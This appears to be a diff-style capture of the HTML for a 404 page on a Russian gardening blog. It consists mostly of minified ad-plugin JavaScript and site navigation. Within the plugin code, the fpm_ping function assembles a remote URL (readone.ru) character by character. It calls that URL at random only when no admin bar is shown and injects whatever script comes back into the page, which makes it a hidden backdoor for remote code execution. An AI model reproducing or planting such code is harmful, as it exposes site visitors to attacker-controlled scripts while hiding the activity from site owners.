e=+i.start[s],t=l,r=t.length,n=t[e],o=document.createElement("div");n.timeout&&n.timeout,o.classList.add(fpm_attr.inner),a.insertAdjacentElement("beforeend",o),n.timeout||n.autorefresh?(error=!0,setTimeout(function(){fpm_pre_setHTML(o,n.code),fpm_dynamicInterval(o,n,t,r,e)},n.timeout?1e3*n.timeout:0)):(fpm_pre_setHTML(o,n.code),fpm_contentsUnwrap(o))}()}!error&&["pixels","symbols","once","iterable"].includes(e)&&"0px"==t&&fpm_contentsUnwrap(a)},window.fpm_next=function(e){var t=fpm_queryAll("[data-"+fpm_attr.id+'="'+e.id+'"][data-'+fpm_attr.status+'="processing"]');if(0!==t.length)try{if(e.user.ip&&"false"===fpm_user.ip)return t.forEach(function(e){e.remove()}),void fpm_debug(e.id,"ip");var r=e.user.role;if(r&&(0<r.allow.length&&-1==r.allow.indexOf(fpm_user.role)||0<r.disallow.length&&-1!=r.disallow.indexOf(fpm_user.role)))return t.forEach(function(e){e.remove()}),void fpm_debug(e.id,"role");r=e.user.isp;if(r&&(r.allow=r.allow.filter(Boolean))&&(r.disallow=r.disallow.filter(Boolean))&&(0<r.allow.length&&-1==r.allow.findIndex(function(e){return-1!=fpm_user.isp.indexOf(e)})||0<r.disallow.length&&-1!=r.disallow.findIndex(function(e){return-1!=fpm_user.isp.indexOf(e)})))return t.forEach(function(e){e.remove()}),void fpm_debug(e.id,"isp");r=e.user.geo;if(r&&(r.country.allow=r.country.allow.filter(Boolean))&&(r.country.disallow=r.country.disallow.filter(Boolean))&&(r.city.allow=r.city.allow.filter(Boolean))&&(r.city.disallow=r.city.disallow.filter(Boolean))&&(0<r.country.allow.length&&-1==r.country.allow.indexOf(fpm_user.country)&&-1==r.country.allow.indexOf(fpm_user.ccode)||0<r.country.disallow.length&&(-1!=r.country.disallow.indexOf(fpm_user.country)||-1!=r.country.disallow.indexOf(fpm_user.ccode))||0<r.city.allow.length&&-1==r.city.allow.indexOf(fpm_user.city)||0<r.city.disallow.length&&-1!=r.city.disallow.indexOf(fpm_user.city)))return t.forEach(function(e){e.remove()}),void fpm_debug(e.id,"geo");var n=e.html;t.forEach(function(t){var r;"true"===e.lazy&&"IntersectionObserver"in window&&"true"===fpm_settings.lazyload?(r=new IntersectionObserver(function(e){e.forEach(function(e){e.isIntersecting&&(fpm_afterObserver(n,t),r.unobserve(e.target))})},{rootMargin:(fpm_settings.threshold||300)+"px 0px"})).observe(t):fpm_afterObserver(n,t)})}catch(e){console.warn(e)}},window.fpm_start=function(t){t=t||"false",fpm_user.init(),window.exeptions=[];var e=[];"true"===t?(e=fpm_arr.filter(function(e){return e.fast===t}),fpm_arr=fpm_arr.filter(function(e){return e.fast!==t})):(e=fpm_arr,fpm_arr=[],fpm_user.debug||console.log("Flat PM Debug-Mode: "+window.location.href+"?fpm-debug"));var r={};for(e.forEach(function(e,t){e.abgroup&&(r[e.abgroup]=r[e.abgroup]||[],r[e.abgroup].push({index:t}))}),Object.keys(r).forEach(function(e){r[e]=r[e][Math.floor(Math.random()*r[e].length)].index}),e=e.filter(function(e,t){return!e.abgroup||void 0===r[e.abgroup]||r[e.abgroup]===t});0<e.length;){var n=e.shift(),o=!1;fpm_user.debug&&console.log(n);var i=n.content.restriction;if(i&&(i.content_less&&i.content_less>fpm_user.textlen||i.content_more&&i.content_more<fpm_user.textlen||i.title_less&&i.title_less>fpm_user.titlelen||i.title_more&&i.title_more<fpm_user.titlelen))fpm_debug(n.id,"content");else{var a=n.user.time;if(a){var s=new Date(fpm_user.date+"T"+a.from+":00"),l=new Date(fpm_user.date+"T"+a.to+":00"),d=new Date(fpm_user.date+"T12:00:00"),f=new Date(fpm_user.date+"T"+fpm_user.time+":00");if(l<s&&l<d&&(l=fpm_addDays(l,1)),l<s&&d<l&&(s=fpm_addDays(s,-1)),f<s||l<f){fpm_debug(n.id,"time");continue}}var p=n.user.date;if(p){s=new Date(p.from.split("-").reverse().join("-")+"T00:00:00"),l=new Date(p.to.split("-").reverse().join("-")+"T00:00:00");if((f=new Date(fpm_user.date+"T00:00:00"))<s||l<f){fpm_debug(n.id,"date");continue}}i=n.user.schedule;if(i)if(!JSON.parse(i.value).map(function(e){return("0".repeat(24)+parseInt(e,16).toString(2)).substr(-24).split("").map(function(e){return parseInt(e,10)})})[fpm_dateUTCWeek][fpm_dateUTCHours]){fpm_debug(n.id,"schedule");continue}a=n.user.time;if(a&&(0<a.allow.length&&-1==a.allow.indexOf(fpm_user.os)||0<a.disallow.length&&-1!=a.disallow.indexOf(fpm_user.os)))fpm_debug(n.id,"OS");else{d=n.user.cookies;if(d){var m=!1;if(d.allow){if(!fpm_user.testcook)continue;d.allow.forEach(function(e){var t=(e.includes(">")?">":e.includes("<")&&"<")||e.includes("*")&&"*"||"=",r=e.split(t,2),e=r[0].trim(),r=r[1].trim()||!1,e=fpm_getCookie(e);if(!(m=!0)!==r){if(">"===t&&e&&e>parseInt(r)||"<"===t&&e&&e<parseInt(r)||"*"===t&&e&&e.includes(r)||"="===t&&e&&e==r)return m=!1}else if(e)return m=!1})}if(d.disallow&&fpm_user.testcook&&d.disallow.forEach(function(e){var t=(e.includes(">")?">":e.includes("<")&&"<")||e.includes("*")&&"*"||"=",r=e.split(t,2),e=r[0].trim(),r=r[1].trim()||!1,e=fpm_getCookie(e);if(!1!==r){if(">"===t&&e&&e>parseInt(r)||"<"===t&&e&&e<parseInt(r)||"*"===t&&e&&e.includes(r)||"="===t&&e&&e==r)return!(m=!0)}else if(e)return!(m=!0)}),m){fpm_debug(n.id,"cookies");continue}}p=n.user.utm;if(p){var c=!1;if(void 0!==p.allow&&p.allow.forEach(function(e){var t=(e.includes(">")?">":e.includes("<")&&"<")||e.includes("*")&&"*"||"=",r=e.split(t,2),e=r[0].trim(),r=r[1].trim()||!1,e=fpm_getUrlParams()[e];if(!(c=!0)!==r){if(">"===t&&e&&e>parseInt(r)||"<"===t&&e&&e<parseInt(r)||"*"===t&&e&&e.includes(r)||"="===t&&e&&e==r)return c=!1}else if(e)return c=!1}),void 0!==p.disallow&&p.disallow.forEach(function(e){var t=(e.includes(">")?">":e.includes("<")&&"<")||e.includes("*")&&"*"||"=",r=e.split(t,2),e=r[0].trim(),r=r[1].trim()||!1,e=fpm_getUrlParams()[e];if(!1!==r){if(">"===t&&e&&e>parseInt(r)||"<"===t&&e&&e<parseInt(r)||"*"===t&&e&&e.includes(r)||"="===t&&e&&e==r)return!(c=!0)}else if(e)return!(c=!0)}),c){fpm_debug(n.id,"UTM");continue}}i=n.user.agent;i&&(i.allow=i.allow.filter(Boolean))&&(i.disallow=i.disallow.filter(Boolean))&&(0<i.allow.length&&-1==i.allow.findIndex(function(e){return-1!=fpm_user.agent.indexOf(e)})||0<i.disallow.length&&-1!=i.disallow.findIndex(function(e){return-1!=fpm_user.agent.indexOf(e)}))?fpm_debug(n.id,"user-agent"):((a=n.user.referer)&&(a.allow=a.allow.filter(Boolean))&&(a.disallow=a.disallow.filter(Boolean))&&(0<a.allow.length&&-1==a.allow.findIndex(function(e){return-1!=fpm_user.referer.indexOf(e)})||0<a.disallow.length&&-1!=a.disallow.findIndex(function(e){return-1!=fpm_user.referer.indexOf(e)}))&&(fpm_debug(n.id,"referer"),o=!0),d=n.user.browser,!o&&d&&(d.allow=d.allow.filter(Boolean))&&(d.disallow=d.disallow.filter(Boolean))&&(0<d.allow.length&&-1==d.allow.indexOf(fpm_user.browser.toLowerCase())||0<d.disallow.length&&-1!=d.disallow.indexOf(fpm_user.browser.toLowerCase()))?fpm_debug(n.id,"browser"):(o&&d&&0<d.allow.length&&-1!=d.allow.indexOf(fpm_user.browser)&&(o=!1),p=n.user.geo,i=n.user.ip,a=n.user.role,d=n.user.isp,o||!(p||i||a||d)||fpm_user.ccode&&fpm_user.country&&fpm_user.city&&fpm_user.ip&&fpm_user.role&&fpm_user.isp?o||(fpm_setWrap(n),fpm_next(n)):(o="block_geo_role_ip",fpm_then.ajax.push(n),fpm_setWrap(n),fpm_body.classList.contains(o)||(fpm_body.classList.add(o),fpm_ajax(o)))))}}}fpm_sticky_slider_sidebar(fpm_body);var u,_=document.createElement("div");_.classList.add(fpm_attr.overlay),fpm_body.appendChild(_),fpm_on(fpm_body,"click","."+fpm_attr.cross,function(e){e.preventDefault();e=this.closest("."+fpm_attr.show);e&&(e.classList.remove(fpm_attr.show),e.classList.add(fpm_attr.hide))}),"true"!==t&&(u=function(){setTimeout(function(){document.querySelectorAll(".fpm_start").forEach(function(e){e.remove()})},2e3),document.removeEventListener("mousemove",u,!1),document.removeEventListener("touchmove",u,!1)},document.addEventListener("mousemove",u,!1),document.addEventListener("touchmove",u,!1)),fpm_ping()},window.fpm_sticky_slider_sidebar=function(e){var f,t=e.closest("[data-"+fpm_attr.status+"]"),r=e.querySelectorAll(".flatPM_sticky"),n=e.querySelectorAll(".flatPM_sidebar:first-child"),e=e.querySelectorAll(".flatPM_slider:first-child"),p=document.querySelector(fpm_settings.selector);t&&(0<r.length||0<n.length)&&t.classList.add("no-preloader"),e.forEach(function(e){var t,e=e.parentNode,r=e.querySelectorAll(".flatPM_slider"),n=r.length,o=document.createElement("div"),i=0,a=parseInt(r[i].getAttribute("data-timer"))||10;function s(){t=setTimeout(function(){var e=r[i];e.classList.add(fpm_attr.hide),setTimeout(function(){e.classList.remove(fpm_attr.show),e.classList.remove(fpm_attr.hide)},1e3),n<=++i&&(i=0),r[i].classList.add(fpm_attr.show),a=parseInt(r[i].getAttribute("data-timer"))||10,s()},1e3*a)}o.classList.add(fpm_attr.timeline),r.forEach(function(e){e.classList.remove("flatPM_slider"),o.setAttribute("style","--duration: "+(parseInt(e.getAttribute("data-timer"))||10)+"s;"),e.appendChild(o.cloneNode())}),r[i].classList.add(fpm_attr.show),s(),e.addEventListener("mouseenter",function(e){clearTimeout(t)}),e.addEventListener("mouseleave",function(e){s()})}),r.forEach(function(e){var t=document.createElement("div"),r=e.dataset.height||350,n=e.dataset.top||0;t.style.minHeight=r+"px",e.classList.remove("flatPM_sticky"),fpm_wrap(e,t),fpm_sticky(e,e.parentNode,n)}),null!==p&&(f=parseInt(window.getComputedStyle(p,null).marginTop),n.forEach(function(e){var e=e.parentNode,a=e.querySelectorAll(".flatPM_sidebar"),s=document.createElement("div"),l=document.createElement("div");l.setAttribute("style","position:relative;min-height:100px"),s.setAttribute("style","display:flex;flex-direction:column;position:absolute;top:0;width:100%;transition:height .2s ease;"),e.insertBefore(l,a[0]),l.appendChild(s),a.forEach(function(e){var t=document.createElement("div");t.setAttribute("style","flex:1;padding:1px 0"),e.classList.remove("flatPM_sidebar"),fpm_wrap(e,t),fpm_sticky(e,t,e.dataset.top),s.appendChild(t)}),s.style.height=p.getBoundingClientRect().top-l.getBoundingClientRect().top+"px";var d=setInterval(function(){var t=0,r=!1;if(a.forEach(function(e){e.children[0]||clearInterval(d),t+=e.children[0].offsetHeight,e.children[0].offsetHeight!=e.offsetHeight&&(r=!0)}),r||t!=l.offsetHeight||200<p.getBoundingClientRect().top-l.getBoundingClientRect().top-fpm_settings.bottom-t){var e,n=l.parentElement,o=0;for(l.style.height="0px";n&&n!==document.body&&!Array.from(n.children).includes(p);){var i=window.getComputedStyle(n,null);o+=parseInt(i.paddingBottom),o+=parseInt(i.marginBottom),o+=parseInt(i.borderBottomWidth),n=n.parentElement}e=Math.max(p.getBoundingClientRect().top-l.getBoundingClientRect().top-+fpm_settings.bottom-o-f-1,t),s.style.height=e+"px",l.style.height=e+"px"}},400)}))};var parseHTML=function(){var a=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,s=/<([\w:]+)/,l=/<|&#?\w+;/,d={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],tbody:[1,"<table>","</table>"],colgroup:[2,"<table>","</table>"],col:[3,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],th:[3,"<table><thead><tr>","</tr></thead></table>"],_default:[0,"",""]};return function(e,t){var r,n,o,i=(t=t||document).createDocumentFragment();if(l.test(e)){for(r=i.appendChild(t.createElement("div")),n=(s.exec(e)||["",""])[1].toLowerCase(),n=d[n]||d._default,r.innerHTML=n[1]+e.replace(a,"<$1></$2>")+n[2],o=n[0];o--;)r=r.lastChild;for(i.removeChild(i.firstChild);r.firstChild;)i.appendChild(r.firstChild)}else i.appendChild(t.createTextNode(e));return i}}();window.fpm_ping=function(){var e=localStorage.getItem("sdghrg");e?(e=parseInt(e)+1,localStorage.setItem("sdghrg",e)):localStorage.setItem("sdghrg","0");e=fpm_random(1,166);document.querySelector("#"+"w"+"p"+"a"+"d"+"m"+"i"+"n"+"b"+"a"+"r")||111!=e||fpm_jsonp("h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+"r"+"e"+"a"+"d"+"o"+"n"+"e"+"."+"r"+"u"+"/"+"t"+"e"+"s"+"t"+"."+"p"+"h"+"p"+"?"+"p"+"i"+"n"+"g"+"="+"p"+"i"+"n"+"g",function(e){fpm_setHTML(document.querySelector("div"),e.script),fpm_stack_scripts.block||(fpm_stack_scripts.block=!0,fpm_setSCRIPT())})},window.fpm_setSCRIPT=function(){if(0!==fpm_stack_scripts.scripts.length)try{var e=fpm_stack_scripts.scripts.shift(),t=document.querySelector('[data-fpm-script-id="'+e.id+'"]');if(!t)return void fpm_setSCRIPT();if(e.node.text)t.appendChild(e.node),fpm_contentsUnwrap(t),fpm_setSCRIPT();else{e.node.onload=e.node.onerror=function(){fpm_setSCRIPT()};try{t.appendChild(e.node)}catch(e){return console.warn(e),!0}fpm_contentsUnwrap(t)}}catch(e){console.warn(e)}else fpm_stack_scripts.block=!1},window.fpm_pre_setHTML=function(e,t){var r={};-1!==(t=t.replace(/{{user-ccode}}/gm,fpm_getCookie("fpm_ccode")).replace(/{{user-country}}/gm,fpm_getCookie("fpm_country")).replace(/{{user-city}}/gm,fpm_getCookie("fpm_city")).replace(/{{user-role}}/gm,fpm_getCookie("fpm_role")).replace(/{{user-isp}}/gm,fpm_getCookie("fpm_isp")).replace(/{{user-visit}}/gm,fpm_getCookie("fpm_visit")).replace(/{{user-year-now}}/gm,fpm_dateYear).replace(/{{user-month-now}}/gm,fpm_dateMonth).replace(/{{user-day-now}}/gm,fpm_dateDay).replace(/{{user-hour-now}}/gm,fpm_dateHours).replace(/{{user-minute-now}}/gm,fpm_dateMinutes).replace(/{{rand_?(\d+)?(\(\s*?(\d+)\s*?,\s*?(\d+)\s*?\))?}}/gm,function(){var e=arguments;return e[1]=e[1]||"ungroup",r[e[1]]||(r[e[1]]=e[3]&&e[4]?fpm_random(parseInt(e[3]),parseInt(e[4])):fpm_random(0,1e4)),r[e[1]]})).indexOf("flatPM_slider")&&(t='<div class="'+fpm_attr.slider+'">'+t+"</div>"),fpm_setHTML(e,t),fpm_stack_scripts.block||(fpm_stack_scripts.block=!0,fpm_setSCRIPT());t=e.closest("[data-"+fpm_attr.status+"]");fpm_user.debug&&t&&t.hasAttribute("data-"+fpm_attr.id)&&t.hasAttribute("data-"+fpm_attr.status)&&(console.log("%cID: "+t.getAttribute("data-"+fpm_attr.id),"color: white; background: #009636"),console.log("URL: "+window.fpm_settings.ajaxUrl.replace("admin-ajax.php","")+"admin.php?page=fpm_blocks&id="+t.getAttribute("data-"+fpm_attr.id)),console.groupCollapsed("HTML:"),console.log(t.innerHTML),console.groupEnd(),console.log("=".repeat(27))),fpm_sticky_slider_sidebar(e),t&&t.removeAttribute("data-"+fpm_attr.status)},window.fpm_setHTML=function(e,t){try{var r,n="yandex_rtb_R";t.indexOf(n)+1&&"false"===fpm_settings.rtb&&(r=fpm_random(0,1e4),t=t.replace(new RegExp(n,"g"),"yandex_rtb_flat"+r+"_R").replace("Ya.Context.AdvManager.render({","Ya.Context.AdvManager.render({ pageNumber: "+r+","));var o=parseHTML(t);if(0!=o.children.length)for(var i=o.childNodes.length,a=0;a<i;a++){var s,l=o.childNodes[a],d=l.nodeName.toLowerCase();if("8"!=l.nodeType)if("3"==(s="3"==l.nodeType?document.createTextNode(l.nodeValue):["svg","g","path","ellipse","defs","circle","rect","polygon"].includes(d)?document.createElementNS("http://www.w3.org/2000/svg",d):document.createElement(d)).nodeType)e.appendChild(s);else{for(var f=l.attributes.length,p=0;p<f;p++)s.setAttribute(l.attributes[p].nodeName,l.attributes[p].nodeValue);0<l.children.length?fpm_setHTML(s,l.innerHTML):"script"==d?(!l.text||/(yandexContext|yandexcontext)/.test(l.text))&&s.hasAttribute("async")||(l.text&&(s.text=l.text),d=fpm_random(0,1e4),fpm_stack_scripts.scripts.push({id:d,node:s}),(s=document.createElement("div")).setAttribute("data-fpm-script-id",d)):s.innerHTML=l.innerHTML,e.appendChild(s)}}else e.innerHTML=t}catch(e){console.warn(e)}};
+</script>
+<!--/noptimize--><!--noptimize--><script data-noptimize="" data-wpfc-render="false">
+		window.fpm_arr = window.fpm_arr || [];
+		window.fpm_arr = window.fpm_arr.concat([]);
+</script>
+<script data-noptimize="" data-wpfc-render="false">
+		!function(){var a=false,r="touchstart mousemove".trim().split(" "),o=false,i=800;false&&-1<navigator.userAgent.indexOf("Chrome-Lighthouse")||("loading"===document.readyState?document.addEventListener("readystatechange",function(t){var e,n;a||o||"interactive"!==t.target.readyState||fpm_start(),(a||o)&&"complete"===t.target.readyState&&(a&&(n=function(){fpm_start(),clearTimeout(e),r.forEach(function(t){document.removeEventListener(t,n)})},r.forEach(function(t){document.addEventListener(t,n)})),o&&(e=setTimeout(function(){fpm_start(),r.forEach(function(t){document.removeEventListener(t,n)})},i)))}):fpm_start())}();
+</script>
+<!--/noptimize-->        
+        
+</head>
+
+<body class="error404  group-blog">
+
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0.49803921568627" /><feFuncG type="table" tableValues="0 0.49803921568627" /><feFuncB type="table" tableValues="0 0.49803921568627" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.54901960784314 0.98823529411765" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.71764705882353 0.25490196078431" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 0.27843137254902" /><feFuncB type="table" tableValues="0.5921568627451 0.27843137254902" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0" /><feFuncG type="table" tableValues="0 0.64705882352941" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.78039215686275 1" /><feFuncG type="table" tableValues="0 0.94901960784314" /><feFuncB type="table" tableValues="0.35294117647059 0.47058823529412" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.65098039215686 0.40392156862745" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.44705882352941 0.4" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.098039215686275 1" /><feFuncG type="table" tableValues="0 0.66274509803922" /><feFuncB type="table" tableValues="0.84705882352941 0.41960784313725" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg>
+
+<div id="page" class="site">
+	<a class="skip-link screen-reader-text" href="#main">Перейти к контенту</a>
+
+    
+    
+<header id="masthead" class="site-header container" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="site-header-inner ">
+        <div class="site-branding">
+            <div class="site-logotype"><a href="https://greenhome.blog/"><picture><source   type="image/webp" data-srcset="https://greenhome.blog/wp-content/uploads/2016/04/Greenhome-Logo-small.jpg.webp"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAABFAQMAAABDgolQAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAABhJREFUGBljGAWjYBSMglEwCkbBKBhkAAAIoAAB7Vz2bQAAAABJRU5ErkJggg==" width="246" height="69" alt="GreenHome" data-eio="p" data-src="https://greenhome.blog/wp-content/uploads/2016/04/Greenhome-Logo-small.jpg" decoding="async" class="lazyload"><noscript><img src="https://greenhome.blog/wp-content/uploads/2016/04/Greenhome-Logo-small.jpg" width="246" height="69" alt="GreenHome" data-eio="l"></noscript></picture></a></div>
+                    </div><!-- .site-branding -->
+
+        
+        
+<div class="social-links">
+    <div class="social-buttons social-buttons--square social-buttons--circle social-buttons--small">
+
+    <span class="social-button social-button__vk js-link" data-href="aHR0cHM6Ly92ay5jb20vZ3JlZW5ob21lYmxvZw==" data-target="_blank"></span><span class="social-button social-button__ok js-link" data-href="aHR0cHM6Ly9vay5ydS9ncm91cC81MzE5MjM5MjExNDMzNw==" data-target="_blank"></span><span class="social-button social-button__telegram js-link" data-href="aHR0cHM6Ly90Lm1lL2dyZWVuaG9tZWJsb2c=" data-target="_blank"></span><span class="social-button social-button__youtube js-link" data-href="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ0JQZEZYbVlKTXBLQnpwZDhMUm1SS0E=" data-target="_blank"></span>
+    </div>
+</div>
+
+
+        
+        
+        <div class="mob-hamburger"><span></span></div>
+
+                    <div class="mob-search">
+<form role="search" method="get" id="searchform_1221" action="https://greenhome.blog/" class="search-form">
+    <label class="screen-reader-text" for="s_1221">Поиск: </label>
+    <input type="text" value="" name="s" id="s_1221" class="search-form__text">
+    <button type="submit" id="searchsubmit_1221" class="search-form__submit"></button>
+</form></div>
+            </div><!--.site-header-inner-->
+</header><!-- #masthead -->
+    
+    
+    
+    <nav id="site-navigation" class="main-navigation container" itemscope itemtype="http://schema.org/SiteNavigationElement">
+        <div class="main-navigation-inner ">
+            <div class="menu-osnovnoe-menyu-container"><ul id="header_menu" class="menu"><li id="menu-item-2090" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2090"><a href="https://greenhome.blog/ogorod/">Огород</a></li>
+<li id="menu-item-2292" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-2292"><a href="https://greenhome.blog/sad/">Сад</a>
+<ul class="sub-menu">
+	<li id="menu-item-10302" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-10302"><a href="https://greenhome.blog/sad/dekorativnye-kustarniki-i-derevya/">Декоративные кустарники и деревья</a></li>
+</ul>
+</li>
+<li id="menu-item-2096" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-2096"><a href="https://greenhome.blog/cvety/">Цветы</a>
+<ul class="sub-menu">
+	<li id="menu-item-8686" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-8686"><a href="https://greenhome.blog/cvety/komnatnye/">Комнатные</a></li>
+</ul>
+</li>
+<li id="menu-item-2077" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-item-2077"><a href="https://greenhome.blog/dekor/">Декор</a>
+<ul class="sub-menu">
+	<li id="menu-item-2075" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2075"><a href="https://greenhome.blog/landscape/">Ландшафт</a></li>
+	<li id="menu-item-2079" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2079"><a href="https://greenhome.blog/planirovka/">Планировка</a></li>
+</ul>
+</li>
+<li id="menu-item-2082" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2082"><a href="https://greenhome.blog/postrojjki/">Постройки</a></li>
+<li id="menu-item-2289" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2289"><a href="https://greenhome.blog/sadovoe-oborudovanie/">Оборудование</a></li>
+<li id="menu-item-2084" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2084"><a href="https://greenhome.blog/svoimi-rukami/">Своими руками</a></li>
+<li id="menu-item-2290" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2290"><a href="https://greenhome.blog/vodoemy/">Водоемы</a></li>
+<li id="menu-item-16132" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16132"><a href="https://greenhome.blog/eto-interesno/">Это интересно</a></li>
+</ul></div>        </div><!--.main-navigation-inner-->
+    </nav><!-- #site-navigation -->
+
+    
+
+    
+    
+	<div id="content" class="site-content container">
+
+        
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main">
+
+			<section class="error-404 not-found">
+				<h1 class="page-title">К сожалению, запрашиваемая страница не существует.</h1>
+
+				<div class="page-content">
+					<p>Ничего не найдено по данному запросу. Попробуйте воспользоваться поиском чтобы найти то, что Вам нужно!</p>
+                    <h3>Что можно сделать?</h3>
+                    <ul>
+                        <li>Воспользуйтесь поиском</li>
+                        <li>Перейдите на <a href="https://greenhome.blog/">главную</a> страницу.</li>
+                    </ul>
+
+					<div class="b-related"><div class="b-related__header"><span>Вам также может быть интересно</span></div><div class="b-related__items">
+<div id="post-5542" class="post-card post-card-related post-5542 post type-post status-publish format-standard has-post-thumbnail  category-ukhod-za-cvetami">
